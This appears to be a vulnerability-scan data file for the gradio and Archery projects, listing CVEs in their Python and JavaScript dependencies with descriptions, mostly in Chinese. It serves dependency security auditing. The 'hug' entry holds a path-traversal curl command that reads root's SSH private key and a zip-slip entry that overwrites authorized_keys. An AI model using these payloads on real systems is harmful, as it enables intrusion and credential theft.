gradio-app_gradio,starlette,0.45.3,True,CVE-2025-62727,CWE-407,2025-10-28,"Starlette 是一个轻量级的 ASGI 框架和工具包，主要用于构建基于 Python 的异步 Web 服务。它支持高性能的异步请求处理，并提供如路由、中间件、静态文件服务等功能。

此漏洞出现在 Starlette 的 FileResponse 组件中，该组件用于处理文件响应，例如通过 StaticFiles 或直接使用 FileResponse 提供静态文件服务时。
在 0.49.1 版本之前，未经身份验证的攻击者可以发送一个精心构造的 HTTP Range 头，触发 FileResponse 的 Range 头解析和合并逻辑中的二次时间复杂度处理。具体来说，FileResponse 的 `_parse_range_header()` 方法在解析多范围请求时，使用的正则表达式存在 O(n^2) 的复杂度，导致处理时间显著增加。此外，合并逻辑通过扫描整个结果列表进一步放大了这种复杂度，从而使每个请求能够引发 CPU 资源的耗尽，导致拒绝服务攻击。
该漏洞的技术细节包括：
- 使用 `_RANGE_PATTERN` 正则表达式解析 Range 头部时，处理时间复杂度为 O(n^2)。
- 合并范围时，遍历结果列表进行比较，也会导致 O(n^2) 的处理时间。
攻击者可以通过构造包含多个小的、不重叠的范围或特定数字子串的 Range 头，最大化处理复杂度。
该问题影响所有使用 FileResponse 或 StaticFiles 提供文件服务的 Starlette 应用程序，同时也间接影响基于 Starlette 构建的框架，例如 FastAPI。",2,1
gradio-app_gradio,torch,2.6.0,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,2.6.0,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,2.6.0,True,CVE-2025-46149,CWE-617,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，提供了深度学习模型的训练和推理能力。nn.Fold 是 PyTorch 中的一个函数模块，通常用于将不规则形状的张量重新折叠成特定的形状，广泛应用于图像处理和计算机视觉任务中。漏洞出现在 PyTorch 2.7.0 版本之前，当启用 inductor 后，nn.Fold 函数会触发断言错误。这表明系统在特定代码路径中未正确处理输入或状态，导致未预期的行为。断言错误通常是由于未满足的前提条件或错误的逻辑验证触发，可能被攻击者利用来导致程序异常或潜在的代码执行。,3,2
gradio-app_gradio,torch,2.6.0,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,2.6.0,True,CVE-2025-46152,CWE-787,2025-09-25,PyTorch 是一个广泛使用的深度学习框架，提供了灵活的神经网络构建和训练功能。其 bitwise_right_shift 函数用于执行位右移操作。在 2.7.0 之前的版本中，当函数的 'other' 参数超出有效值范围时，会产生错误输出。这一问题的根本原因在于对输入值的边界检查不当，导致某些越界值未被正确处理，从而输出意外结果。这种行为可能会影响依赖该函数计算结果的应用逻辑，尤其是在需要高精度计算的场景下。,4,2
gradio-app_gradio,torch,2.6.0,True,CVE-2025-46153,CWE-1176,2025-09-25,PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能应用中。其组件包括 nn 模块提供各种神经网络的构建块，如 Dropout1d、Dropout2d 和 Dropout3d 等，用于防止过拟合。漏洞源于 bernoulli_p 函数在 decompositions.py 中的实现未能与 eager CPU 实现保持完全一致性，当 fallback_random=True 时，可能导致 Dropout 模块未能按预期执行的逻辑问题。其根本原因在于 bernoulli_p 函数的随机性与预期的 CPU 一致性逻辑相违背，影响了随机生成的结果的正确性。这可能带来神经网络训练过程中模型不稳定性，尤其是在某些依赖随机性的操作场景中，导致模型训练结果不可靠。,4,2
gradio-app_gradio,torch,2.6.0,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,2.6.0,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,2.6.0,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,2.6.0,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,2.6.0,True,CVE-2025-46150,CWE-823,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于机器学习任务和神经网络的开发。FractionalMaxPool2d 是 PyTorch 提供的一种池化层，用于对输入数据进行降维操作。在 PyTorch 2.7.0 之前的版本中，当使用 torch.compile 功能时，FractionalMaxPool2d 会出现结果不一致的问题。这可能是由于在编译优化过程中，未正确处理该组件的操作逻辑，从而导致结果的不可预测性。此问题可能会影响模型的稳定性和正确性。,3,2
gradio-app_gradio,torch,2.6.0,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,2.6.0,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,2.6.0,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,2.6.0,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,2.6.0,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,2.6.0,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,2.6.0,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,4.48.1,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,4.48.1,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,4.48.1,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,4.48.1,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,4.48.1,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,4.48.1,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,4.48.1,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,4.48.1,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,4.48.1,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,4.48.1,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,4.48.1,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,urllib3,2.3.0,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
gradio-app_gradio,urllib3,2.3.0,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
gradio-app_gradio,hug,,True,,CWE-22,2017-10-30,"## Overview
[`hug`](https://pypi.python.org/pypi/hug) is a Python framework that makes developing APIs as simple as possible.

Affected versions of this package are vulnerable to Directory Traversal.

## Details
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```


## References
- [Github ChangeLog](https://github.com/timothycrosley/hug/blob/develop/CHANGELOG.md#230---may-4-2017)
- [Github Issue](https://github.com/timothycrosley/hug/issues/471)
- [Github PR](https://github.com/timothycrosley/hug/pull/472)
- [Github Commit](https://github.com/timothycrosley/hug/commit/4ed846a3e0539be4f9ea841ff7467fd3dec95b95)
",2,2
gradio-app_gradio,cookie,0.6.0,False,CVE-2024-47764,CWE-74,2024-10-04,"cookie是jshttp开源的一个 HTTP 服务器 cookie 解析和序列化库。
cookie 0.7.0之前版本存在安全漏洞，该漏洞源于允许攻击者通过操纵cookie名称来设置cookie的其他字段，导致意外的cookie值。",3,2
gradio-app_gradio,happy-dom,19.0.2,True,CVE-2025-62410,CWE-1321,2025-10-15,happy-dom 是一个用于模拟浏览器环境的 JavaScript 库，主要用于无头浏览器的测试和操作。在版本 20.0.2 之前，该库的选项 --disallow-code-generation-from-strings 不足以隔离不受信任的 JavaScript代码。不受信任的脚本和应用程序的其他部分仍运行在同一个 Isolate/进程中，这使得攻击者可以通过原型污染漏洞加载恶意 Payload。例如，攻击者可以篡改内置对象的属性（如 Object.prototype.hasOwnProperty()），从而在运行时劫持关键引用（如 process 对象）。此外，漏洞还可能允许攻击者操纵控制流，例如翻转未定义属性的检查状态。该漏洞的根本原因是 CVE-2025-61927 的修复不完全，未能完全隔离脚本环境。,1,-2
gradio-app_gradio,cookie,0.6.0,False,CVE-2024-47764,CWE-74,2024-10-04,"cookie是jshttp开源的一个 HTTP 服务器 cookie 解析和序列化库。
cookie 0.7.0之前版本存在安全漏洞，该漏洞源于允许攻击者通过操纵cookie名称来设置cookie的其他字段，导致意外的cookie值。",3,2
gradio-app_gradio,cookie,0.6.0,False,CVE-2024-47764,CWE-74,2024-10-04,"cookie是jshttp开源的一个 HTTP 服务器 cookie 解析和序列化库。
cookie 0.7.0之前版本存在安全漏洞，该漏洞源于允许攻击者通过操纵cookie名称来设置cookie的其他字段，导致意外的cookie值。",3,2
gradio-app_gradio,cookie,0.6.0,False,CVE-2024-47764,CWE-74,2024-10-04,"cookie是jshttp开源的一个 HTTP 服务器 cookie 解析和序列化库。
cookie 0.7.0之前版本存在安全漏洞，该漏洞源于允许攻击者通过操纵cookie名称来设置cookie的其他字段，导致意外的cookie值。",3,2
hhyo_Archery,codecov,,True,,CWE-78,2020-04-01,"## Overview
[codecov](https://pypi.org/project/codecov) is a Python report uploader for Codecov.

Affected versions of this package are vulnerable to Command Injection caused by `shell` being defined as `TRUE` in the command line.
## Remediation
Upgrade `codecov` to version 2.0.17 or higher.
## References
- [GitHub Commit](https://github.com/codecov/codecov-python/commit/f2c93c7893847e50639416c1bc2e38cb375825d8)
- [GitHub PR](https://github.com/codecov/codecov-python/pull/234)
",3,0
hhyo_Archery,codecov,,True,CVE-2019-10800,CWE-88,2020-02-25,"codecov是codecov开源的一种专用代码覆盖解决方案。
codecov 2.0.16之前的版本存在安全漏洞，该漏洞源于在向popen方法提供gcov参数之前没有对其进行清理",2,0
hhyo_Archery,Django,4.1.13,True,CVE-2024-27351,CWE-1333,2024-03-04,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.0版本，4.2版本，3.2版本存在安全漏洞，该漏洞源于Truncator.words函数和truncatewords_html过滤器存在拒绝服务（DOS）漏洞。</p>,3,0
hhyo_Archery,Django,4.1.13,True,CVE-2024-41990,CWE-130,2024-08-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在安全漏洞，该漏洞源于urlize和urlizetrunc模板过滤器可能会通过具有特定字符序列的超大输入遭受潜在的拒绝服务攻击。",3,2
hhyo_Archery,Django,4.1.13,True,CVE-2024-41991,CWE-1284 CWE-130,2024-08-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在安全漏洞，该漏洞源于urlize和urlizetrunc模板过滤器以及AdminURLFieldWidget小部件可能会通过包含大量Unicode字符的某些输入遭受潜在的拒绝服务攻击。",3,2
hhyo_Archery,Django,4.1.13,True,CVE-2024-42005,CWE-89,2024-08-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在SQL注入漏洞，该漏洞源于当使用带有JSONField的模型的QuerySet.values和values_list方法时，通过精心构造的JSON对象键作为传递的*arg，可能会受到SQL注入攻击。",1,2
hhyo_Archery,Django,4.1.13,True,CVE-2024-41989,CWE-400,2024-08-07,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在安全漏洞，该漏洞源于当给出一个以科学计数法表示的数字的字符串表示形式且指数较大时floatformat模板过滤器会消耗大量内存。</p>,3,2
hhyo_Archery,Django,4.1.13,True,CVE-2024-39330,CWE-22,2024-07-10,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0版本至5.0.7之前版本、4.2版本至4.2.14之前版本存在安全漏洞，该漏洞源于允许在save()调用期间通过某些输入进行目录遍历。",3,0
hhyo_Archery,Django,4.1.13,True,CVE-2024-38875,CWE-130,2024-07-10,该漏洞存在于Django框架中，影响了Django 4.2版本（截至4.2.14之前）和5.0版本（截至5.0.7之前）。漏洞允许远程攻击者通过向`urlize`和`urlizetrunc`函数提供包含大量括号的输入，执行拒绝服务攻击和用户枚举。,3,2
hhyo_Archery,Django,4.1.13,True,CVE-2024-39614,CWE-130,2024-07-10,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0.7之前版本和4.2.14之前版本存在安全漏洞，该漏洞源于get_supported_language_variant()在与包含特定字符的超长字符串一起使用时会遭受拒绝服务攻击。受影响版本如下:5.1版本、5.0版本、4.2版本。",3,1
hhyo_Archery,Django,4.1.13,True,CVE-2024-39329,CWE-208,2024-07-10,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0版本至5.0.7之前版本、4.2版本至4.2.14之前版本存在安全漏洞，该漏洞源于django.contrib.auth.backends.ModelBackend.authenticate()方法允许远程攻击者通过定时攻击枚举用户。",3,2
hhyo_Archery,Django,4.1.13,True,CVE-2024-45230,CWE-120,2024-09-04,<p>Django 是一个流行的 Python Web 框架，用于高效构建 Web 应用。`urlize` 是 Django 提供的一个实用工具函数，位于 `django.utils.html` 模块中，主要功能是将字符串中可以解释为 URL 的部分自动转换为超链接（HTML 的  标签）。漏洞的根因在于 `urlize` 函数在处理特定重复字符序列（例如 `.;`）时，算法的复杂度未优化，引发性能退化。当输入字符串包含大量重复的特定格式字符时，`urlize` 函数的运行时间会呈指数增长，从而导致拒绝服务（DoS）场景。攻击者可以通过恶意构造的字符串触发此漏洞，例如以下代码：`from django.utils.html import urlize; malicious_input = .; * 100000; urlize(malicious_input)`，结果会使服务器资源耗尽，导致服务不可用。</p>,3,2
hhyo_Archery,Django,4.1.13,True,CVE-2024-24680,CWE-400,2024-02-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django存在安全漏洞。攻击者利用该漏洞导致系统拒绝服务。以下版本受到影响：3.2版本至3.2.24之前版本、4.2版本至4.2.10之前版本、5.0版本至5.0.2之前版本。",2,2
hhyo_Archery,Django,4.1.13,True,CVE-2024-45231,CWE-203,2024-09-04,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django v5.1.1版本、v5.0.9版本和v4.2.16版本存在安全漏洞。攻击者利用该漏洞通过发送密码重置请求来枚举用户电子邮件地址。",3,2
hhyo_Archery,Django,4.1.13,True,CVE-2025-57833,CWE-89,2025-09-03,<p>Django 是一个流行的 Python Web 开发框架，提供了高效的 ORM（对象关系映射）功能以简化数据库操作。FilteredRelation 是 Django ORM 中的一种功能，用于在查询中定义过滤关联关系。此漏洞（CVE-2025-57833）涉及 FilteredRelation 的列别名处理，因未对输入的列别名进行充分验证而导致攻击者能够通过构造恶意输入绕过列别名的安全校验，从而实现 SQL 注入攻击。攻击者可以利用该漏洞，通过在 QuerySet.annotate() 或 QuerySet.alias() 方法中传递特制的字典（通过 **kwargs 进行字典展开），插入任意 SQL 命令。此漏洞影响 Django 4.2.24 之前版本、5.1.12 之前版本和 5.2.6 之前版本。</p>,2,2
hhyo_Archery,Django,4.1.13,True,CVE-2025-26699,CWE-770,2025-03-06,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.1.7、5.0.13和4.2.20之前版本存在安全漏洞，该漏洞源于django.utils.text.wrap方法和wordwrap模板过滤器在处理非常长的字符串时可能导致拒绝服务攻击。</p>,2,0
hhyo_Archery,Django,4.1.13,True,CVE-2025-48432,CWE-117,2025-06-05,<p>Django 是一个流行的基于 Python 的 Web 应用框架，提供快捷方便的开发方式和整洁的设计准则。此漏洞存在于 Django 版本 5.2（早于 5.2.2）、5.1（早于 5.1.10）和 4.2（早于 4.2.22）中。其原因是内部 HTTP 响应日志记录未对 request.path 进行必要的转义，从而允许远程攻击者通过精心设计的 URL 来操纵日志输出。当日志在终端中查看或由外部系统处理时，可能导致日志注入或伪造。</p>,3,2
hhyo_Archery,Django,4.1.13,True,CVE-2025-64458,CWE-407,2025-11-05,Django 是一个流行的 Python Web 框架，广泛用于开发高效和可扩展的 Web 应用程序。这一漏洞主要影响 Django 框架的 5.1 版本（低于 5.1.14）、4.2 版本（低于 4.2.26）和 5.2 版本（低于 5.2.8）。漏洞的根本原因是 Windows 平台上 Python 的 NFKC 字符归一化功能在处理大量 Unicode 字符时性能较差，导致 `django.http.HttpResponseRedirect`、`django.http.HttpResponsePermanentRedirect` 和 `django.shortcuts.redirect` 方法可能因处理特定构造的输入而受到拒绝服务攻击的影响。攻击者可以利用包含大量 Unicode 字符的输入消耗服务器资源，从而导致服务中断。另外，早期不受支持的 Django 版本（如 5.0.x、4.1.x 和 3.2.x）也可能受到此问题的影响，但尚未经过系统评估。,2,2
hhyo_Archery,requests,2.31.0,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
hhyo_Archery,requests,2.31.0,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
hhyo_Archery,requests,2.31.0,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
hhyo_Archery,pymysql,0.9.3,True,CVE-2024-36039,CWE-89,2024-05-21,当PyMySQL 1.1.0及以下版本与未受信任的JSON输入一起使用时，由于escape_dict未能对键进行转义，导致存在SQL注入漏洞。攻击者通过构造恶意的JSON输入，可以在数据库层面执行任意SQL命令。,3,0
hhyo_Archery,redis,3.5.3,True,CVE-2023-28858,CWE-193,2023-03-24,"redis-py是基于Python的redis接口库。
redis-py 4.5.3之前版本存在安全漏洞。攻击者利用该漏洞可以将响应数据发送到客户端。",3,0
